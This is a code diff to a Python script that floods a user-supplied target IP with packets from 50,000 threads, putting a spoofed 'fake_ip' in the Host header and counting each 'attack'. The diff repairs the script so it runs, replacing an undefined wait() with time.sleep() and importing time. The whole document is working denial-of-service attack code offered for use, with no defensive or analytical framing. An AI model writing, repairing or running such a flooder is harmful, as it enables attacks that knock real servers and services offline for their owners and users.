@@ -4,6 +4,7 @@
 
 import socket
 import threading
+import time
 
 target = input("Enter target ip: ")
 fake_ip = "125.47.192.66"
@@ -19,7 +20,7 @@ def attack():
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
         global attack_num
         attack_num += 1
-        print("attack block re-executed:", attack_num )
+        print("attack re-executed:", attack_num )
         s.close()
         
 for i in range(50000):
@@ -27,10 +28,11 @@ for i in range(50000):
     thread.start()
     if(thread.is_alive):
         print("sending packets.")
-        wait(0.3)
+        time.sleep(0.3)
         print("sending packets..")
-        wait(0.3)
+        time.sleep(0.3)
         print("sending packets...")
+        time.sleep(0.3)
     elif OSError or Exception in thread:
         thread.start()
     else:
